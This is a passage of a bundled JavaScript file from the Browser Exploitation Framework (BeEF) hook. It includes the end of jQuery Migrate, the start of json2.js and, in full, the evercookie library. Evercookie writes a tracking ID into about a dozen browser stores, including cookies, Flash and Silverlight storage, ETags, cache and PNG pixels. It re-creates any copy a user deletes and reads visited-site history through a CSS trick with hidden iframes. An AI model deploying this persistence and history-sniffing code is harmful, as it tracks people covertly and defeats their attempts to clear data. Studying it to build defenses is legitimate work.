        eventRemove.call(this, elem, hoverHack(types) || "", handler, selector, mappedTypes);
    }
    ;

    jQuery.each(["load", "unload", "error"], function(_, name) {

        jQuery.fn[name] = function() {
            var args = Array.prototype.slice.call(arguments, 0);

            // If this is an ajax load() the first arg should be the string URL;
            // technically this could also be the "Anything" arg of the event .load()
            // which just goes to show why this dumb signature has been deprecated!
            // jQuery custom builds that exclude the Ajax module justifiably die here.
            if (name === "load" && typeof args[0] === "string") {
                return oldLoad.apply(this, args);
            }

            migrateWarn("jQuery.fn." + name + "() is deprecated");

            args.splice(0, 0, name);
            if (arguments.length) {
                return this.bind.apply(this, args);
            }

            // Use .triggerHandler here because:
            // - load and unload events don't need to bubble, only applied to window or image
            // - error event should not bubble to window, although it does pre-1.7
            // See http://bugs.jquery.com/ticket/11820
            this.triggerHandler.apply(this, args);
            return this;
        }
        ;

    });

    jQuery.fn.toggle = function(fn, fn2) {

        // Don't mess with animation or css toggles
        if (!jQuery.isFunction(fn) || !jQuery.isFunction(fn2)) {
            return oldToggle.apply(this, arguments);
        }
        migrateWarn("jQuery.fn.toggle(handler, handler...) is deprecated");

        // Save reference to arguments for access in closure
        var args = arguments
          , guid = fn.guid || jQuery.guid++
          , i = 0
          , toggler = function(event) {
            // Figure out which function to execute
            var lastToggle = (jQuery._data(this, "lastToggle" + fn.guid) || 0) % i;
            jQuery._data(this, "lastToggle" + fn.guid, lastToggle + 1);

            // Make sure that clicks stop
            event.preventDefault();

            // and execute the function
            return args[lastToggle].apply(this, arguments) || false;
        };

        // link all the functions, so any of them can unbind this click handler
        toggler.guid = guid;
        while (i < args.length) {
            args[i++].guid = guid;
        }

        return this.click(toggler);
    }
    ;

    jQuery.fn.live = function(types, data, fn) {
        migrateWarn("jQuery.fn.live() is deprecated");
        if (oldLive) {
            return oldLive.apply(this, arguments);
        }
        jQuery(this.context).on(types, this.selector, data, fn);
        return this;
    }
    ;

    jQuery.fn.die = function(types, fn) {
        migrateWarn("jQuery.fn.die() is deprecated");
        if (oldDie) {
            return oldDie.apply(this, arguments);
        }
        jQuery(this.context).off(types, this.selector || "**", fn);
        return this;
    }
    ;

    // Turn global events into document-triggered events
    jQuery.event.trigger = function(event, data, elem, onlyHandlers) {
        if (!elem && !rajaxEvent.test(event)) {
            migrateWarn("Global events are undocumented and deprecated");
        }
        return eventTrigger.call(this, event, data, elem || document, onlyHandlers);
    }
    ;
    jQuery.each(ajaxEvents.split("|"), function(_, name) {
        jQuery.event.special[name] = {
            setup: function() {
                var elem = this;

                // The document needs no shimming; must be !== for oldIE
                if (elem !== document) {
                    jQuery.event.add(document, name + "." + jQuery.guid, function() {
                        jQuery.event.trigger(name, Array.prototype.slice.call(arguments, 1), elem, true);
                    });
                    jQuery._data(this, name, jQuery.guid++);
                }
                return false;
            },
            teardown: function() {
                if (this !== document) {
                    jQuery.event.remove(document, name + "." + jQuery._data(this, name));
                }
                return false;
            }
        };
    });

    jQuery.event.special.ready = {
        setup: function() {
            if (this === document) {
                migrateWarn("'ready' event is deprecated");
            }
        }
    };

    var oldSelf = jQuery.fn.andSelf || jQuery.fn.addBack
      , oldFnFind = jQuery.fn.find;

    jQuery.fn.andSelf = function() {
        migrateWarn("jQuery.fn.andSelf() replaced by jQuery.fn.addBack()");
        return oldSelf.apply(this, arguments);
    }
    ;

    jQuery.fn.find = function(selector) {
        var ret = oldFnFind.apply(this, arguments);
        ret.context = this.context;
        ret.selector = this.selector ? this.selector + " " + selector : selector;
        return ret;
    }
    ;

    // jQuery 1.6 did not support Callbacks, do not warn there
    if (jQuery.Callbacks) {

        var oldDeferred = jQuery.Deferred
          , tuples = [// action, add listener, callbacks, .then handlers, final state
        ["resolve", "done", jQuery.Callbacks("once memory"), jQuery.Callbacks("once memory"), "resolved"], ["reject", "fail", jQuery.Callbacks("once memory"), jQuery.Callbacks("once memory"), "rejected"], ["notify", "progress", jQuery.Callbacks("memory"), jQuery.Callbacks("memory")]];

        jQuery.Deferred = function(func) {
            var deferred = oldDeferred()
              , promise = deferred.promise();

            deferred.pipe = promise.pipe = function(/* fnDone, fnFail, fnProgress */
            ) {
                var fns = arguments;

                migrateWarn("deferred.pipe() is deprecated");

                return jQuery.Deferred(function(newDefer) {
                    jQuery.each(tuples, function(i, tuple) {
                        var fn = jQuery.isFunction(fns[i]) && fns[i];
                        // deferred.done(function() { bind to newDefer or newDefer.resolve })
                        // deferred.fail(function() { bind to newDefer or newDefer.reject })
                        // deferred.progress(function() { bind to newDefer or newDefer.notify })
                        deferred[tuple[1]](function() {
                            var returned = fn && fn.apply(this, arguments);
                            if (returned && jQuery.isFunction(returned.promise)) {
                                returned.promise().done(newDefer.resolve).fail(newDefer.reject).progress(newDefer.notify);
                            } else {
                                newDefer[tuple[0] + "With"](this === promise ? newDefer.promise() : this, fn ? [returned] : arguments);
                            }
                        });
                    });
                    fns = null;
                }).promise();

            }
            ;

            deferred.isResolved = function() {
                migrateWarn("deferred.isResolved is deprecated");
                return deferred.state() === "resolved";
            }
            ;

            deferred.isRejected = function() {
                migrateWarn("deferred.isRejected is deprecated");
                return deferred.state() === "rejected";
            }
            ;

            if (func) {
                func.call(deferred, deferred);
            }

            return deferred;
        }
        ;

    }

}
)(jQuery, window);

//
// Copyright (c) 2006-2019 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*
 * evercookie 0.4 (10/13/2010) -- extremely persistent cookies
 *
 *  by samy kamkar : code@samy.pl : http://samy.pl
 *
 * this api attempts to produce several types of persistent data
 * to essentially make a cookie virtually irrevocable from a system
 *
 * specifically it uses:
 *  - standard http cookies
 *  - flash cookies (local shared objects)
 *  - silverlight isolated storage
 *  - png generation w/forced cache and html5 canvas pixel reading
 *  - http etags
 *  - http cache
 *  - window.name
 *  - IE userData
 *  - html5 session cookies
 *  - html5 local storage
 *  - html5 global storage
 *  - html5 database storage via sqlite
 *  - css history scanning
 *
 *  if any cookie is found, it's then reset to all the other locations
 *  for example, if someone deletes all but one type of cookie, once
 *  that cookie is re-discovered, all of the other cookie types get reset
 *
 *  !!! SOME OF THESE ARE CROSS-DOMAIN COOKIES, THIS MEANS
 *  OTHER SITES WILL BE ABLE TO READ SOME OF THESE COOKIES !!!
 *
 * USAGE:

	var ec = new evercookie();	
	
	// set a cookie "id" to "12345"
	// usage: ec.set(key, value)
	ec.set("id", "12345");
	
	// retrieve a cookie called "id" (simply)
	ec.get("id", function(value) { alert("Cookie value is " + value) });

	// or use a more advanced callback function for getting our cookie
    // the cookie value is the first param
    // an object containing the different storage methods
	// and returned cookie values is the second parameter
    function getCookie(best_candidate, all_candidates)
    {
        alert("The retrieved cookie is: " + best_candidate + "\n" +
        	"You can see what each storage mechanism returned " +
			"by looping through the all_candidates object.");

		for (var item in all_candidates)
			document.write("Storage mechanism " + item +
				" returned " + all_candidates[item] + " votes<br>");
    }
    ec.get("id", getCookie);

	// we look for "candidates" based off the number of "cookies" that
	// come back matching since it's possible for mismatching cookies.
	// the best candidate is very-very-likely the correct one
	
*/

/* to turn off CSS history knocking, set _ec_history to 0 */
var _ec_history = 1;
// CSS history knocking or not .. can be network intensive
var _ec_tests = 10;
//1000;
var _ec_debug = 0;

function _ec_dump(arr, level) {
    var dumped_text = "";
    if (!level)
        level = 0;

    //The padding given at the beginning of the line.
    var level_padding = "";
    for (var j = 0; j < level + 1; j++)
        level_padding += "    ";

    if (typeof (arr) == 'object') {
        //Array/Hashes/Objects 
        for (var item in arr) {
            var value = arr[item];

            if (typeof (value) == 'object') {
                //If it is an array,
                dumped_text += level_padding + "'" + item + "' ...\n";
                dumped_text += _ec_dump(value, level + 1);
            } else {
                dumped_text += level_padding + "'" + item + "' => \"" + value + "\"\n";
            }
        }
    } else {
        //Stings/Chars/Numbers etc.
        dumped_text = "===>" + arr + "<===(" + typeof (arr) + ")";
    }
    return dumped_text;
}

function _ec_replace(str, key, value) {
    if (str.indexOf('&' + key + '=') > -1 || str.indexOf(key + '=') == 0) {
        // find start
        var idx = str.indexOf('&' + key + '=');
        if (idx == -1)
            idx = str.indexOf(key + '=');

        // find end
        var end = str.indexOf('&', idx + 1);
        var newstr;
        if (end != -1)
            newstr = str.substr(0, idx) + str.substr(end + (idx ? 0 : 1)) + '&' + key + '=' + value;
        else
            newstr = str.substr(0, idx) + '&' + key + '=' + value;

        return newstr;
    } else
        return str + '&' + key + '=' + value;
}

// necessary for flash to communicate with js...
// please implement a better way
var _global_lso;
function _evercookie_flash_var(cookie) {
    _global_lso = cookie;

    // remove the flash object now
    var swf = $('#myswf');
    if (swf && swf.parentNode)
        swf.parentNode.removeChild(swf);
}

var evercookie = (function() {
    this._class = function() {

        var self = this;
        // private property
        _baseKeyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
        this._ec = {};
        var no_color = -1;

        this.get = function(name, cb, dont_reset) {
            $(document).ready(function() {
                self._evercookie(name, cb, undefined, undefined, dont_reset);
            });
        }
        ;

        this.set = function(name, value) {
            $(document).ready(function() {
                self._evercookie(name, function() {}, value);
            });
        }
        ;

        this._evercookie = function(name, cb, value, i, dont_reset) {
            if (typeof self._evercookie == 'undefined')
                self = this;

            if (typeof i == 'undefined')
                i = 0;

            // first run
            if (i == 0) {
                self.evercookie_database_storage(name, value);
                self.evercookie_png(name, value);
                self.evercookie_etag(name, value);
                self.evercookie_cache(name, value);
                self.evercookie_lso(name, value);
                self.evercookie_silverlight(name, value);

                self._ec.userData = self.evercookie_userdata(name, value);
                self._ec.cookieData = self.evercookie_cookie(name, value);
                self._ec.localData = self.evercookie_local_storage(name, value);
                self._ec.globalData = self.evercookie_global_storage(name, value);
                self._ec.sessionData = self.evercookie_session_storage(name, value);
                self._ec.windowData = self.evercookie_window(name, value);

                if (_ec_history)
                    self._ec.historyData = self.evercookie_history(name, value);
            }

            // when writing data, we need to make sure lso and silverlight object is there
            if (typeof value != 'undefined') {
                if (((typeof _global_lso == 'undefined') || (typeof _global_isolated == 'undefined')) && i++ < _ec_tests)
                    setTimeout(function() {
                        self._evercookie(name, cb, value, i, dont_reset)
                    }, 300);
            }
            // when reading data, we need to wait for swf, db, silverlight and png
            else {
                if ((// we support local db and haven't read data in yet
                (window.openDatabase && typeof self._ec.dbData == 'undefined') || (typeof _global_lso == 'undefined') || (typeof self._ec.etagData == 'undefined') || (typeof self._ec.cacheData == 'undefined') || (document.createElement('canvas').getContext && (typeof self._ec.pngData == 'undefined' || self._ec.pngData == '')) || (typeof _global_isolated == 'undefined')) && i++ < _ec_tests) {
                    setTimeout(function() {
                        self._evercookie(name, cb, value, i, dont_reset)
                    }, 300);
                }
                // we hit our max wait time or got all our data
                else {
                    // get just the piece of data we need from swf
                    self._ec.lsoData = self.getFromStr(name, _global_lso);
                    _global_lso = undefined;

                    // get just the piece of data we need from silverlight
                    self._ec.slData = self.getFromStr(name, _global_isolated);
                    _global_isolated = undefined;

                    var tmpec = self._ec;
                    self._ec = {};

                    // figure out which is the best candidate
                    var candidates = new Array();
                    var bestnum = 0;
                    var candidate;
                    for (var item in tmpec) {
                        if (typeof tmpec[item] != 'undefined' && typeof tmpec[item] != 'null' && tmpec[item] != '' && tmpec[item] != 'null' && tmpec[item] != 'undefined' && tmpec[item] != null) {
                            candidates[tmpec[item]] = typeof candidates[tmpec[item]] == 'undefined' ? 1 : candidates[tmpec[item]] + 1;
                        }
                    }

                    for (var item in candidates) {
                        if (candidates[item] > bestnum) {
                            bestnum = candidates[item];
                            candidate = item;
                        }
                    }

                    // reset cookie everywhere
                    if (typeof dont_reset == "undefined" || dont_reset != 1)
                        self.set(name, candidate);

                    if (typeof cb == 'function')
                        cb(candidate, tmpec);
                }
            }
        }
        ;

        this.evercookie_window = function(name, value) {
            try {
                if (typeof (value) != "undefined")
                    window.name = _ec_replace(window.name, name, value);
                else
                    return this.getFromStr(name, window.name);
            } catch (e) {}
        }
        ;

        this.evercookie_userdata = function(name, value) {
            try {
                var elm = this.createElem('div', 'userdata_el', 1);
                elm.style.behavior = "url(#default#userData)";

                if (typeof (value) != "undefined") {
                    elm.setAttribute(name, value);
                    elm.save(name);
                } else {
                    elm.load(name);
                    return elm.getAttribute(name);
                }
            } catch (e) {}
        }
        ;

        this.evercookie_cache = function(name, value) {
            if (typeof (value) != "undefined") {
                // make sure we have evercookie session defined first
                document.cookie = 'evercookie_cache=' + value;

                // evercookie_cache.php handles caching
                var img = new Image();
                img.style.visibility = 'hidden';
                img.style.position = 'absolute';
                img.src = 'evercookie_cache.php?name=' + name;
            } else {
                // interestingly enough, we want to erase our evercookie
                // http cookie so the php will force a cached response
                var origvalue = this.getFromStr('evercookie_cache', document.cookie);
                self._ec.cacheData = undefined;
                document.cookie = 'evercookie_cache=; expires=Mon, 20 Sep 2010 00:00:00 UTC; path=/';

                $.ajax({
                    url: 'evercookie_cache.php?name=' + name,
                    success: function(data) {
                        // put our cookie back
                        document.cookie = 'evercookie_cache=' + origvalue + '; expires=Tue, 31 Dec 2030 00:00:00 UTC; path=/';

                        self._ec.cacheData = data;
                    }
                });
            }
        }
        ;

        this.evercookie_etag = function(name, value) {
            if (typeof (value) != "undefined") {
                // make sure we have evercookie session defined first
                document.cookie = 'evercookie_etag=' + value;

                // evercookie_etag.php handles etagging
                var img = new Image();
                img.style.visibility = 'hidden';
                img.style.position = 'absolute';
                img.src = 'evercookie_etag.php?name=' + name;
            } else {
                // interestingly enough, we want to erase our evercookie
                // http cookie so the php will force a cached response
                var origvalue = this.getFromStr('evercookie_etag', document.cookie);
                self._ec.etagData = undefined;
                document.cookie = 'evercookie_etag=; expires=Mon, 20 Sep 2010 00:00:00 UTC; path=/';

                $.ajax({
                    url: 'evercookie_etag.php?name=' + name,
                    success: function(data) {
                        // put our cookie back
                        document.cookie = 'evercookie_etag=' + origvalue + '; expires=Tue, 31 Dec 2030 00:00:00 UTC; path=/';

                        self._ec.etagData = data;
                    }
                });
            }
        }
        ;

        this.evercookie_lso = function(name, value) {
            var div = document.getElementById('swfcontainer');
            if (!div) {
                div = document.createElement("div");
                div.setAttribute('id', 'swfcontainer');
                document.body.appendChild(div);
            }

            var flashvars = {};
            if (typeof value != 'undefined')
                flashvars.everdata = name + '=' + value;

            var params = {};
            params.swliveconnect = "true";
            var attributes = {};
            attributes.id = "myswf";
            attributes.name = "myswf";
            swfobject.embedSWF("evercookie.swf", "swfcontainer", "1", "1", "9.0.0", false, flashvars, params, attributes);
        }
        ;

        this.evercookie_png = function(name, value) {
            if (document.createElement('canvas').getContext) {
                if (typeof (value) != "undefined") {
                    // make sure we have evercookie session defined first
                    document.cookie = 'evercookie_png=' + value;

                    // evercookie_png.php handles the hard part of generating the image
                    // based off of the http cookie and returning it cached
                    var img = new Image();
                    img.style.visibility = 'hidden';
                    img.style.position = 'absolute';
                    img.src = 'evercookie_png.php?name=' + name;
                } else {
                    self._ec.pngData = undefined;
                    var context = document.createElement('canvas');
                    context.style.visibility = 'hidden';
                    context.style.position = 'absolute';
                    context.width = 200;
                    context.height = 1;
                    var ctx = context.getContext('2d');

                    // interestingly enough, we want to erase our evercookie
                    // http cookie so the php will force a cached response
                    var origvalue = this.getFromStr('evercookie_png', document.cookie);
                    document.cookie = 'evercookie_png=; expires=Mon, 20 Sep 2010 00:00:00 UTC; path=/';

                    var img = new Image();
                    img.style.visibility = 'hidden';
                    img.style.position = 'absolute';
                    img.src = 'evercookie_png.php?name=' + name;

                    img.onload = function() {
                        // put our cookie back
                        document.cookie = 'evercookie_png=' + origvalue + '; expires=Tue, 31 Dec 2030 00:00:00 UTC; path=/';

                        self._ec.pngData = '';
                        ctx.drawImage(img, 0, 0);

                        // get CanvasPixelArray from  given coordinates and dimensions
                        var imgd = ctx.getImageData(0, 0, 200, 1);
                        var pix = imgd.data;

                        // loop over each pixel to get the "RGB" values (ignore alpha)
                        for (var i = 0, n = pix.length; i < n; i += 4) {
                            if (pix[i] == 0)
                                break;
                            self._ec.pngData += String.fromCharCode(pix[i]);
                            if (pix[i + 1] == 0)
                                break;
                            self._ec.pngData += String.fromCharCode(pix[i + 1]);
                            if (pix[i + 2] == 0)
                                break;
                            self._ec.pngData += String.fromCharCode(pix[i + 2]);
                        }
                    }
                }
            }
        }
        ;

        this.evercookie_local_storage = function(name, value) {
            try {
                if (window.localStorage) {
                    if (typeof (value) != "undefined")
                        localStorage.setItem(name, value);
                    else
                        return localStorage.getItem(name);
                }
            } catch (e) {}
        }
        ;

        this.evercookie_database_storage = function(name, value) {
            try {
                if (window.openDatabase) {
                    var database = window.openDatabase("sqlite_evercookie", "", "evercookie", 1024 * 1024);

                    if (typeof (value) != "undefined")
                        database.transaction(function(tx) {
                            tx.executeSql("CREATE TABLE IF NOT EXISTS cache(" + "id INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT, " + "name TEXT NOT NULL, " + "value TEXT NOT NULL, " + "UNIQUE (name)" + ")", [], function(tx, rs) {}, function(tx, err) {});

                            tx.executeSql("INSERT OR REPLACE INTO cache(name, value) VALUES(?, ?)", [name, value], function(tx, rs) {}, function(tx, err) {})
                        });
                    else {
                        database.transaction(function(tx) {
                            tx.executeSql("SELECT value FROM cache WHERE name=?", [name], function(tx, result1) {
                                if (result1.rows.length >= 1)
                                    self._ec.dbData = result1.rows.item(0)['value'];
                                else
                                    self._ec.dbData = '';
                            }, function(tx, err) {})
                        });
                    }
                }
            } catch (e) {}
        }
        ;

        this.evercookie_session_storage = function(name, value) {
            try {
                if (window.sessionStorage) {
                    if (typeof (value) != "undefined")
                        sessionStorage.setItem(name, value);
                    else
                        return sessionStorage.getItem(name);
                }
            } catch (e) {}
        }
        ;

        this.evercookie_global_storage = function(name, value) {
            if (window.globalStorage) {
                var host = this.getHost();

                try {
                    if (typeof (value) != "undefined")
                        eval("globalStorage[host]." + name + " = value");
                    else
                        return eval("globalStorage[host]." + name);
                } catch (e) {}
            }
        }
        ;
        this.evercookie_silverlight = function(name, value) {
            /*
     * Create silverlight embed
     * 
     * Ok. so, I tried doing this the proper dom way, but IE chokes on appending anything in object tags (including params), so this
     * is the best method I found. Someone really needs to find a less hack-ish way. I hate the look of this shit.
    */
            var source = "evercookie.xap";
            var minver = "4.0.50401.0";

            var initParam = "";
            if (typeof (value) != "undefined")
                initParam = '<param name="initParams" value="' + name + '=' + value + '" />';

            var html = '<object data="data:application/x-silverlight-2," type="application/x-silverlight-2" id="mysilverlight" width="0" height="0">' + initParam + '<param name="source" value="' + source + '"/>' + '<param name="onLoad" value="onSilverlightLoad"/>' + '<param name="onError" value="onSilverlightError"/>' + '<param name="background" value="Transparent"/>' + '<param name="windowless" value="true"/>' + '<param name="minRuntimeVersion" value="' + minver + '"/>' + '<param name="autoUpgrade" value="true"/>' + '<a href="http://go.microsoft.com/fwlink/?LinkID=149156&v=' + minver + '" style="text-decoration:none">' + '<img src="http://go.microsoft.com/fwlink/?LinkId=108181" alt="Get Microsoft Silverlight" style="border-style:none"/>' + '</a>' + '</object>';
            document.body.innerHTML += html;
        }
        ;

        // public method for encoding
        this.encode = function(input) {
            var output = "";
            var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
            var i = 0;

            input = this._utf8_encode(input);

            while (i < input.length) {

                chr1 = input.charCodeAt(i++);
                chr2 = input.charCodeAt(i++);
                chr3 = input.charCodeAt(i++);

                enc1 = chr1 >> 2;
                enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
                enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
                enc4 = chr3 & 63;

                if (isNaN(chr2)) {
                    enc3 = enc4 = 64;
                } else if (isNaN(chr3)) {
                    enc4 = 64;
                }

                output = output + _baseKeyStr.charAt(enc1) + _baseKeyStr.charAt(enc2) + _baseKeyStr.charAt(enc3) + _baseKeyStr.charAt(enc4);

            }

            return output;
        }
        ;

        // public method for decoding
        this.decode = function(input) {
            var output = "";
            var chr1, chr2, chr3;
            var enc1, enc2, enc3, enc4;
            var i = 0;

            input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");

            while (i < input.length) {
                enc1 = _baseKeyStr.indexOf(input.charAt(i++));
                enc2 = _baseKeyStr.indexOf(input.charAt(i++));
                enc3 = _baseKeyStr.indexOf(input.charAt(i++));
                enc4 = _baseKeyStr.indexOf(input.charAt(i++));

                chr1 = (enc1 << 2) | (enc2 >> 4);
                chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
                chr3 = ((enc3 & 3) << 6) | enc4;

                output = output + String.fromCharCode(chr1);

                if (enc3 != 64) {
                    output = output + String.fromCharCode(chr2);
                }
                if (enc4 != 64) {
                    output = output + String.fromCharCode(chr3);
                }

            }

            output = this._utf8_decode(output);

            return output;

        }
        ;

        // private method for UTF-8 encoding
        this._utf8_encode = function(string) {
            string = string.replace(/\r\n/g, "\n");
            var utftext = "";

            for (var n = 0; n < string.length; n++) {

                var c = string.charCodeAt(n);

                if (c < 128) {
                    utftext += String.fromCharCode(c);
                } else if ((c > 127) && (c < 2048)) {
                    utftext += String.fromCharCode((c >> 6) | 192);
                    utftext += String.fromCharCode((c & 63) | 128);
                } else {
                    utftext += String.fromCharCode((c >> 12) | 224);
                    utftext += String.fromCharCode(((c >> 6) & 63) | 128);
                    utftext += String.fromCharCode((c & 63) | 128);
                }

            }

            return utftext;
        }
        ;

        // private method for UTF-8 decoding
        this._utf8_decode = function(utftext) {
            var string = "";
            var i = 0;
            var c = c1 = c2 = 0;

            while (i < utftext.length) {

                c = utftext.charCodeAt(i);

                if (c < 128) {
                    string += String.fromCharCode(c);
                    i++;
                } else if ((c > 191) && (c < 224)) {
                    c2 = utftext.charCodeAt(i + 1);
                    string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
                    i += 2;
                } else {
                    c2 = utftext.charCodeAt(i + 1);
                    c3 = utftext.charCodeAt(i + 2);
                    string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
                    i += 3;
                }

            }

            return string;
        }
        ;

        // this is crazy but it's 4am in dublin and i thought this would be hilarious
        // blame the guinness
        this.evercookie_history = function(name, value) {
            // - is special
            var baseStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=-";
            var baseElems = baseStr.split("");

            // sorry google.
            var url = 'http://www.google.com/evercookie/cache/' + this.getHost() + '/' + name;

            if (typeof (value) != "undefined") {
                // don't reset this if we already have it set once
                // too much data and you can't clear previous values
                if (this.hasVisited(url))
                    return;

                this.createIframe(url, 'if');
                url = url + '/';

                var base = this.encode(value).split("");
                for (var i = 0; i < base.length; i++) {
                    url = url + base[i];
                    this.createIframe(url, 'if' + i);
                }

                // - signifies the end of our data
                url = url + '-';
                this.createIframe(url, 'if_');
            } else {
                // omg you got csspwn3d
                if (this.hasVisited(url)) {
                    url = url + '/';

                    var letter = "";
                    var val = "";
                    var found = 1;
                    while (letter != '-' && found == 1) {
                        found = 0;
                        for (var i = 0; i < baseElems.length; i++) {
                            if (this.hasVisited(url + baseElems[i])) {
                                letter = baseElems[i];
                                if (letter != '-')
                                    val = val + letter;
                                url = url + letter;
                                found = 1;
                                break;
                            }
                        }
                    }

                    // lolz
                    return this.decode(val);
                }
            }
        }
        ;

        this.createElem = function(type, name, append) {
            var el;
            if (typeof name != 'undefined' && document.getElementById(name))
                el = document.getElementById(name);
            else
                el = document.createElement(type);
            el.style.visibility = 'hidden';
            el.style.position = 'absolute';

            if (name)
                el.setAttribute('id', name);

            if (append)
                document.body.appendChild(el);

            return el;
        }
        ;

        this.createIframe = function(url, name) {
            var el = this.createElem('iframe', name, 1);
            el.setAttribute('src', url);
            return el;
        }
        ;

        // wait for our swfobject to appear (swfobject.js to load)
        this.waitForSwf = function(i) {
            if (typeof i == 'undefined')
                i = 0;
            else
                i++;

            // wait for ~2 seconds for swfobject to appear
            if (i < _ec_tests && typeof swfobject == 'undefined')
                setTimeout(function() {
                    waitForSwf(i)
                }, 300);
        }
        ;

        this.evercookie_cookie = function(name, value) {
            try {
                if (typeof (value) != "undefined") {
                    // expire the cookie first
                    document.cookie = name + '=; expires=Mon, 20 Sep 2010 00:00:00 UTC; path=/';
                    document.cookie = name + '=' + value + '; expires=Tue, 31 Dec 2030 00:00:00 UTC; path=/';
                } else
                    return this.getFromStr(name, document.cookie);
            } catch (e) {// the hooked domain is using HttpOnly, so we must set the hook ID in a different way.
            // evercookie_userdata and evercookie_window will be used in this case.
            }
        }
        ;

        // get value from param-like string (eg, "x=y&name=VALUE")
        this.getFromStr = function(name, text) {
            if (typeof text != 'string')
                return;

            var nameEQ = name + "=";
            var ca = text.split(/[;&]/);
            for (var i = 0; i < ca.length; i++) {
                var c = ca[i];
                while (c.charAt(0) == ' ')
                    c = c.substring(1, c.length);
                if (c.indexOf(nameEQ) == 0)
                    return c.substring(nameEQ.length, c.length);
            }
        }
        ;

        this.getHost = function() {
            var domain = document.location.host;
            if (domain.indexOf('www.') == 0)
                domain = domain.replace('www.', '');
            return domain;
        }
        ;

        this.toHex = function(str) {
            var r = "";
            var e = str.length;
            var c = 0;
            var h;
            while (c < e) {
                h = str.charCodeAt(c++).toString(16);
                while (h.length < 2)
                    h = "0" + h;
                r += h;
            }
            return r;
        }
        ;

        this.fromHex = function(str) {
            var r = "";
            var e = str.length;
            var s;
            while (e >= 0) {
                s = e - 2;
                r = String.fromCharCode("0x" + str.substring(s, e)) + r;
                e = s;
            }
            return r;
        }
        ;

        /* 
 * css history knocker (determine what sites your visitors have been to)
 *
 * originally by Jeremiah Grossman
 * http://jeremiahgrossman.blogspot.com/2006/08/i-know-where-youve-been.html
 *
 * ported to additional browsers by Samy Kamkar
 *
 * compatible with ie6, ie7, ie8, ff1.5, ff2, ff3, opera, safari, chrome, flock
 *
 * - code@samy.pl
 */

        this.hasVisited = function(url) {
            if (this.no_color == -1) {
                var no_style = this._getRGB("http://samy-was-here-this-should-never-be-visited.com", -1);
                if (no_style == -1)
                    this.no_color = this._getRGB("http://samy-was-here-" + Math.floor(Math.random() * 9999999) + "rand.com");
            }

            // did we give full url?
            if (url.indexOf('https:') == 0 || url.indexOf('http:') == 0)
                return this._testURL(url, this.no_color);

            // if not, just test a few diff types	if (exact)
            return this._testURL("http://" + url, this.no_color) || this._testURL("https://" + url, this.no_color) || this._testURL("http://www." + url, this.no_color) || this._testURL("https://www." + url, this.no_color);
        }
        ;

        /* create our anchor tag */
        var _link = this.createElem('a', '_ec_rgb_link');

        /* for monitoring */
        var created_style;

        /* create a custom style tag for the specific link. Set the CSS visited selector to a known value */
        var _cssText = '#_ec_rgb_link:visited{display:none;color:#FF0000}';

        /* Methods for IE6, IE7, FF, Opera, and Safari */
        try {
            created_style = 1;
            var style = document.createElement('style');
            if (style.styleSheet)
                style.styleSheet.innerHTML = _cssText;
            else if (style.innerHTML)
                style.innerHTML = _cssText;
            else {
                var cssT = document.createTextNode(_cssText);
                style.appendChild(cssT);
            }
        } catch (e) {
            created_style = 0;
        }

        /* if test_color, return -1 if we can't set a style */
        this._getRGB = function(u, test_color) {
            if (test_color && created_style == 0)
                return -1;

            /* create the new anchor tag with the appropriate URL information */
            _link.href = u;
            _link.innerHTML = u;
            // not sure why, but the next two appendChilds always have to happen vs just once
            document.body.appendChild(style);
            document.body.appendChild(_link);

            /* add the link to the DOM and save the visible computed color */
            var color;
            if (document.defaultView)
                color = document.defaultView.getComputedStyle(_link, null).getPropertyValue('color');
            else
                color = _link.currentStyle['color'];

            return color;
        }
        ;

        this._testURL = function(url, no_color) {
            var color = this._getRGB(url);

            /* check to see if the link has been visited if the computed color is red */
            if (color == "rgb(255, 0, 0)" || color == "#ff0000")
                return 1;

                /* if our style trick didn't work, just compare default style colors */
            else if (no_color && color != no_color)
                return 1;

            /* not found */
            return 0;
        }

    }
    ;

    return _class;
}
)();

/*
 * Again, ugly workaround....same problem as flash.
*/
var _global_isolated;
function onSilverlightLoad(sender, args) {
    var control = sender.getHost();
    _global_isolated = control.Content.App.getIsolatedStorage();
}
/*
function onSilverlightError(sender, args) {
    _global_isolated = "";
    
}*/
function onSilverlightError(sender, args) {
    _global_isolated = "";
}

//  json2.js
//  2016-10-28
//  Public Domain.
//  NO WARRANTY EXPRESSED OR IMPLIED. USE AT YOUR OWN RISK.
//  See http://www.JSON.org/js.html
//  This code should be minified before deployment.
//  See http://javascript.crockford.com/jsmin.html

//  USE YOUR OWN COPY. IT IS EXTREMELY UNWISE TO LOAD CODE FROM SERVERS YOU DO
//  NOT CONTROL.

//  This file creates a global JSON object containing two methods: stringify
//  and parse. This file provides the ES5 JSON capability to ES3 systems.
//  If a project might run on IE8 or earlier, then this file should be included.
//  This file does nothing on ES5 systems.

// Create a JSON object only if one does not already exist. We create the
// methods in a closure to avoid creating global variables.

if (typeof JSON !== "object") {
    JSON = {};
}

(function() {
    "use strict";

    var rx_one = /^[\],:{}\s]*$/;
    var rx_two = /\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g;
    var rx_three = /"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g;
    var rx_four = /(?:^|:|,)(?:\s*\[)+/g;
    var rx_escapable = /[\\"\u0000-\u001f\u007f-\u009f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g;
    var rx_dangerous = /[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g;

    function f(n) {
        // Format integers to have at least two digits.
        return n < 10 ? "0" + n : n;
    }

    function this_value() {
        return this.valueOf();
    }

    if (typeof Date.prototype.toJSON !== "function") {

